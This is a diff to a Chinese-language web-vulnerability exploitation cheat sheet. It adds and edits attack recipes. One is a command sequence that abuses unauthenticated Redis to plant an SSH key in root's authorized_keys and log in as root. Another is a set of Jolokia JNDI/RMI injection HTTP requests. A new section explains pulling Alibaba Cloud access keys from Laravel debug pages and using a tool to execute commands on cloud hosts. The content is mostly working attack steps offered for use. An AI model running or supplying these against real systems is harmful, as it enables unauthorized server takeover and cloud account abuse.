@@ -61,6 +61,7 @@ web常见漏洞：
 		* [jolokia未授权漏洞](#jolokia未授权漏洞)
 		* [CRLF_HTTP头注人](#CRLF_HTTP头注人)
 		* [HPP_参数污染漏洞](#HPP_参数污染漏洞)
+		* [阿里云accessKeyId利用](#阿里云accessKeyId利用)
 		* [反序列化漏洞](#反序列化漏洞)
 			* [php反序列化](#php反序列化)
 			* [fastjson反序列化](#fastjson反序列化)
@@ -716,8 +717,7 @@ ssh-keygen -t rsa   # 然后目录下生成2个文件 私钥:id_rsa 公钥:id_rs
 (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > temp.txt
 cat temp.txt #生成的ssh_payload
 (sleep 1;echo "info";sleep 2;echo "set x \"复制生成的ssh_payload\"";sleep 1;echo "config get dir";sleep 2;echo "config get dbfilename";sleep 2;echo "config set dir  /root/.ssh/";sleep 1;echo "config set dbfilename authorized_keys";sleep 1;echo "save";sleep 1;echo "exit")|telnet target 6379
-尝试连接即可:
-ssh root@139.X.X.X -i id_rsa
+ssh root@target -i id_rsa #本地连接即可
 
 ```
 ### axis_rce漏洞
@@ -731,7 +731,7 @@ ssh root@139.X.X.X -i id_rsa
 另利用方法：
 POST /jolokia/ HTTP/1.1
 Host: localhost:10007
-Content-Type: application/x-www-form-urlencoded
+Content-Type: application/json
 Content-Length: 206
 
 {
@@ -741,7 +741,19 @@ Content-Length: 206
          "url" : "service:jmx:rmi:///jndi/ldap://localhost:9092/jmxrmi"
     } 
 }
+或
+POST /jolokia/ HTTP/1.1
+Host: localhost:10007
+Content-Type: application/json
+Content-Length: 206
 
+{
+    "type" : "read",
+    "mbean" : "java.lang:type=Memory",
+    "target" : { 
+         "url" : "service:jmx:rmi:///jndi/rmi://localhost:9092/jmxrmi"
+    } 
+}
 参考：https://xz.aliyun.com/t/2294
 ```
 ### CRLF_HTTP头注人
@@ -798,6 +810,16 @@ https://www.example.com/info.php?action=view&par=12345
 https://www.example.com/info.php?action=view&par=12345?&action=edit
 
 ```
+### 阿里云accessKeyId利用
+漏洞利用工具：
+- [iiiusky/alicloud-tools](https://github.com/iiiusky/alicloud-tools/releases/tag/v1.0.1)
+```
+Laravel站点：可尝试post提交访问，如果存在debug模式可把阿里云accessKeyId和accessSecret爆出来
+其他信息泄露获取：内网配置文件等
+之后使用工具：alicloud-tools进行利用api执行命令 或 OSS浏览文件 或 行云管家管理云主机
+
+```
+
 ### 反序列化漏洞
 
 #### php反序列化
